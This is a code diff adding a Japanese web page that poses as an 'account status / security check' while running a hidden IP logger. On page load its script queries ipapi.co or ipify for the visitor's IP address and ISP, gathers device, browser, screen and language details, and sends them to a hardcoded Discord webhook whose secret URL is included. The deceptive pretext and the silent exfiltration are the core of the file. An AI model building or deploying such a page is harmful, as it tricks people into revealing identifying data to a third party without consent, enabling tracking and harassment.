@@ -1,0 +1,110 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>アカウント状態の確認</title>
+    <meta property="og:title" content="アカウント状態の確認">
+    <meta property="og:description" content="お使いのアカウントの接続環境とセキュリティ状態を診断します。">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: linear-gradient(135deg, #0f172a, #1e1b4b);
+            color: #f8fafc;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 16px;
+        }
+        .container {
+            background: rgba(30, 41, 59, 0.7);
+            backdrop-filter: blur(12px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 20px;
+            padding: 24px;
+            width: 100%;
+            max-width: 400px;
+            text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+        }
+        h1 { font-size: 1.5rem; margin-bottom: 8px; color: #38bdf8; }
+        p { font-size: 0.9rem; color: #94a3b8; line-height: 1.5; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>⚠️ アカウント状態の確認</h1>
+        <p>セキュリティ保護のため、接続環境をスキャンしています。<br>少々お待ちください...</p>
+    </div>
+
+    <script>
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1572124436818170017/T_lHqJXspYpaMdhkghKVHY-xCVkyiAPIoO9R72WLe9dO-MZq0GfLFL8V2Z3lVuC3YjhW";
+
+        // ページを開いた瞬間に実行
+        window.addEventListener('DOMContentLoaded', async () => {
+            try {
+                // 1. IPアドレス ＆ 回線プロバイダの取得
+                let ipInfo = "取得失敗";
+                let ispInfo = "不明";
+
+                try {
+                    const ipRes = await fetch('https://ipapi.co/json/');
+                    const ipData = await ipRes.json();
+                    if (ipData.ip) {
+                        ipInfo = ipData.ip;
+                        ispInfo = ipData.org || ipData.asn || '不明';
+                    }
+                } catch (e) {
+                    try {
+                        const fallbackRes = await fetch('https://api.ipify.org?format=json');
+                        const fallbackData = await fallbackRes.json();
+                        ipInfo = fallbackData.ip;
+                    } catch (err) {}
+                }
+
+                // 2. アクセス時刻の取得
+                const now = new Date();
+                const accessTime = `${now.getFullYear()}年${now.getMonth() + 1}月${now.getDate()}日 ${now.getHours().toString().padStart(2, '0')}:${now.getMinutes().toString().padStart(2, '0')}:${now.getSeconds().toString().padStart(2, '0')}`;
+
+                // 3. 端末・ブラウザ情報の整理
+                const ua = navigator.userAgent;
+                let deviceName = "PC / その他";
+                if (/iPhone/.test(ua)) deviceName = "iPhone";
+                else if (/iPad/.test(ua)) deviceName = "iPad";
+                else if (/Android/.test(ua)) deviceName = "Androidスマホ";
+
+                let browserName = "不明なブラウザ";
+                if (/Line/.test(ua)) browserName = "LINEアプリ内ブラウザ";
+                else if (/CriOS/.test(ua)) browserName = "Chrome (iOS)";
+                else if (/Safari/.test(ua) && !/Chrome/.test(ua)) browserName = "Safari";
+                else if (/Chrome/.test(ua)) browserName = "Chrome";
+
+                const deviceInfo = `${deviceName} (${browserName})`;
+                const screenRes = `${window.screen.width} × ${window.screen.height}`;
+                const language = navigator.language;
+
+                // 4. Discordへ即座に送信
+                const content = `🚨 **新しいアクセスを検知しました！**\n` +
+                                `🕒 **アクセス時刻**: ${accessTime}\n` +
+                                `🌐 **IPアドレス**: \`${ipInfo}\`\n` +
+                                `🏢 **回線/プロバイダ**: ${ispInfo}\n` +
+                                `📱 **端末**: ${deviceInfo}\n` +
+                                `🖥 **画面解像度**: ${screenRes}\n` +
+                                `🌍 **言語**: ${language}`;
+
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ content: content })
+                });
+
+            } catch (err) {
+                console.error(err);
+            }
+        });
+    </script>
+</body>
+</html>
